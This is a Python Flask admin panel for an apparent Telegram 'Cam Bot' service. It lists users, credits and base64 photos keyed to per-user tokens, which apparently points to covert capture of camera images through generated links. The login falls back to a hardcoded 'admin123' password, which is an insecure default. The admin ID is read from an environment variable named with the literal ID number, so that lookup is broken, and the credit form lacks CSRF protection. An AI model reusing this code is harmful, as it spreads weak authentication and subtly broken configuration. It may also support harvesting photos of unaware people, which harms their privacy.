import os
import base64
from flask import Blueprint, render_template_string, request, redirect, session, flash
from database import (
    get_all_users, get_all_photos, get_user_by_id, add_credits,
    log_admin_action, get_admin_logs, get_db
)

admin_bp = Blueprint("admin", __name__, url_prefix="/admin")

# Admin Telegram ID - @KEMA_VPN
ADMIN_TELEGRAM_ID = int(os.environ.get("8375820047", 0))

def is_admin():
    return session.get("admin") == True

# ========== LOGIN ==========
@admin_bp.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        pw = request.form.get("password", "")
        if pw == os.environ.get("ADMIN_PASSWORD", "admin123"):
            session["admin"] = True
            return redirect("/admin")
        return "Hatali sifre", 401

    return """
    <html>
    <head><title>Admin Login</title></head>
    <body style="background:#1a1a2e;color:#fff;font-family:Arial;padding:50px;text-align:center;">
        <h2>Admin Panel</h2>
        <form method="POST">
            <input type="password" name="password" placeholder="Sifre" style="padding:10px;font-size:16px;"><br><br>
            <button type="submit" style="padding:10px 30px;font-size:16px;cursor:pointer;">Giris</button>
        </form>
    </body>
    </html>
    """

# ========== DASHBOARD ==========
@admin_bp.route("/")
def dashboard():
    if not is_admin():
        return redirect("/admin/login")

    users = get_all_users()
    photos = get_all_photos()
    logs = get_admin_logs()

    total_users = len(users)
    total_photos = len(photos)
    total_credits = sum(u["credits"] for u in users)

    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Cam Bot Admin</title>
        <style>
            * { margin:0; padding:0; box-sizing:border-box; }
            body { background:#0f0f23; color:#fff; font-family:Arial; }
            .header { background:#1a1a3e; padding:20px; text-align:center; border-bottom:2px solid #333; }
            .stats { display:flex; justify-content:center; gap:30px; padding:30px; }
            .stat-box { background:#1a1a3e; padding:20px 40px; border-radius:10px; text-align:center; }
            .stat-box h3 { font-size:32px; color:#00ff88; }
            .stat-box p { color:#888; margin-top:5px; }
            .section { padding:20px; max-width:1200px; margin:0 auto; }
            .section h2 { margin-bottom:15px; color:#00ff88; }
            table { width:100%; border-collapse:collapse; background:#1a1a3e; border-radius:10px; overflow:hidden; }
            th, td { padding:12px; text-align:left; border-bottom:1px solid #333; }
            th { background:#252550; color:#00ff88; }
            tr:hover { background:#252550; }
            .btn { padding:5px 15px; background:#00ff88; color:#000; border:none; border-radius:5px; cursor:pointer; }
            .btn-red { background:#ff4444; color:#fff; }
            .photo-thumb { max-width:100px; max-height:100px; border-radius:5px; }
            .nav { display:flex; justify-content:center; gap:20px; padding:20px; }
            .nav a { color:#00ff88; text-decoration:none; font-size:18px; }
            .nav a:hover { text-decoration:underline; }
            .credit-form { display:flex; gap:10px; align-items:center; }
            .credit-form input { padding:5px; width:60px; }
        </style>
    </head>
    <body>
        <div class="header">
            <h1>Cam Bot Admin Panel</h1>
            <div class="nav">
                <a href="#users">Kullanicilar</a>
                <a href="#photos">Fotograflar</a>
                <a href="#logs">Loglar</a>
                <a href="/admin/logout">Cikis</a>
            </div>
        </div>

        <div class="stats">
            <div class="stat-box">
                <h3>{{total_users}}</h3>
                <p>Toplam Kullanici</p>
            </div>
            <div class="stat-box">
                <h3>{{total_photos}}</h3>
                <p>Toplam Fotograf</p>
            </div>
            <div class="stat-box">
                <h3>{{total_credits}}</h3>
                <p>Toplam Kredi</p>
            </div>
        </div>

        <div class="section" id="users">
            <h2>Kullanicilar</h2>
            <table>
                <tr><th>ID</th><th>Telegram ID</th><th>Username</th><th>Kredi</th><th>Kayit Tarihi</th><th>Islem</th></tr>
                {% for u in users %}
                <tr>
                    <td>{{u.id}}</td>
                    <td>{{u.telegram_id}}</td>
                    <td>@{{u.username}}</td>
                    <td>{{u.credits}}</td>
                    <td>{{u.created_at}}</td>
                    <td>
                        <form class="credit-form" method="POST" action="/admin/add_credit">
                            <input type="hidden" name="user_id" value="{{u.id}}">
                            <input type="number" name="amount" value="5" min="1">
                            <button type="submit" class="btn">Kredi Ekle</button>
                        </form>
                    </td>
                </tr>
                {% endfor %}
            </table>
        </div>

        <div class="section" id="photos">
            <h2>Son Fotograflar</h2>
            <table>
                <tr><th>ID</th><th>Kullanici</th><th>Token</th><th>Tarih</th><th>Fotograf</th></tr>
                {% for p in photos[:50] %}
                <tr>
                    <td>{{p.id}}</td>
                    <td>@{{p.username}} (ID:{{p.user_id}})</td>
                    <td>{{p.token}}</td>
                    <td>{{p.created_at}}</td>
                    <td><img class="photo-thumb" src="data:image/jpeg;base64,{{p.photo_data.split(',')[1] if ',' in p.photo_data else p.photo_data}}"></td>
                </tr>
                {% endfor %}
            </table>
        </div>

        <div class="section" id="logs">
            <h2>Admin Loglari</h2>
            <table>
                <tr><th>ID</th><th>Admin ID</th><th>Hedef ID</th><th>Islem</th><th>Miktar</th><th>Tarih</th></tr>
                {% for l in logs %}
                <tr>
                    <td>{{l.id}}</td>
                    <td>{{l.admin_id}}</td>
                    <td>{{l.target_id}}</td>
                    <td>{{l.action}}</td>
                    <td>{{l.amount}}</td>
                    <td>{{l.created_at}}</td>
                </tr>
                {% endfor %}
            </table>
        </div>
    </body>
    </html>
    """

    from flask import render_template_string
    return render_template_string(html, users=users, photos=photos, logs=logs,
                                   total_users=total_users, total_photos=total_photos,
                                   total_credits=total_credits)

# ========== ADD CREDIT ==========
@admin_bp.route("/add_credit", methods=["POST"])
def add_credit():
    if not is_admin():
        return redirect("/admin/login")

    user_id = int(request.form.get("user_id", 0))
    amount = int(request.form.get("amount", 0))

    user = get_user_by_id(user_id)
    if user:
        add_credits(user_id, amount)
        log_admin_action(ADMIN_TELEGRAM_ID, user_id, "ADD_CREDIT", amount)

    return redirect("/admin#users")

# ========== LOGOUT ==========
@admin_bp.route("/logout")
def logout():
    session.clear()
    return redirect("/admin/login")
